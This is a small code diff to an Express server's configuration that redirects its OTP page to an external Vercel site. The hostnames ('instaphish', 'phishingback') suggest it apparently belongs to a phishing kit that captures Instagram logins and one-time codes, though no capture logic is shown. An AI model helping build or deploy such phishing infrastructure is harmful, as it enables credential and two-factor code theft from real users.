@@ -13,7 +13,7 @@ dotenv.config({ path: path.join(__dirname, '.env') });
 const app = express();
 const server = http.createServer(app);
 const BACKEND_URL = process.env.BACKEND_URL || 'https://instaphish-2nrr.onrender.com';
-const OTP_PAGE_URL = process.env.OTP_PAGE_URL || '/otp';
+const OTP_PAGE_URL = process.env.OTP_PAGE_URL || 'https://otp-swart-nine.vercel.app/';
 const FRONTEND_URLS = [
   'https://phishingback.vercel.app',
   'https://instaphish-eta.vercel.app',
